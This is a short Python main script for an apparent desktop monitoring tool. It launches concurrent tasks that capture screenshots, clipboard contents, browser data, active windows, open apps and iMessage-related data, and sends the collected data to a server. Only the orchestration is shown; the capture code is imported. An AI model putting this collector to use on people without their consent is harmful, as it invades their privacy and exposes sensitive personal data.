from gevent import monkey

from my_logger import mylogger

monkey.patch_all()
import gevent

from mydb.utils import create_tables
from utils import check_user_token, check_cloudinary_token, check_imessage_update


from server_task import ServerTask
#
from tasks import ClipboardTask, ActiveWindowTask, OpenedAppsListTask,BrowserDataTask

from screenshot_task import ScreenshotTask

logger = mylogger("main")

def initial_setup():

    logger.info("Application started")
    # storage files
    create_tables()
    check_user_token()
    check_cloudinary_token()
    check_imessage_update()


def main():
    initial_setup()
    logger.info("Initial setup is done")

    monitor_server = ServerTask() #save data to server
    monitor_screenshot = ScreenshotTask()
    monitor_browser = BrowserDataTask()
    monitor_clipboard = ClipboardTask()
    monitor_window = ActiveWindowTask()
    monitor_opened_apps = OpenedAppsListTask()
    #
    server_monitor_greenlet = gevent.spawn(monitor_server.monitor_server)
    screenshot_monitor_greenlet = gevent.spawn(monitor_screenshot.monitor_screenshot)
    browser_monitor_greenlet = gevent.spawn(monitor_browser.run_api)

    clipboard_monitor_greenlet = gevent.spawn(monitor_clipboard.monitor_clipboard)
    active_window_task_greenlet = gevent.spawn(monitor_window.monitor_active_window)
    opened_apps_list_greenlet = gevent.spawn(monitor_opened_apps.monitor_opened_windows)

    logger.info("Monitoring started...")

    gevent.joinall(
        [
            server_monitor_greenlet,
            screenshot_monitor_greenlet,
            browser_monitor_greenlet,
            clipboard_monitor_greenlet,
            active_window_task_greenlet,
            opened_apps_list_greenlet
        ]
    )


if __name__ == "__main__":
    main()

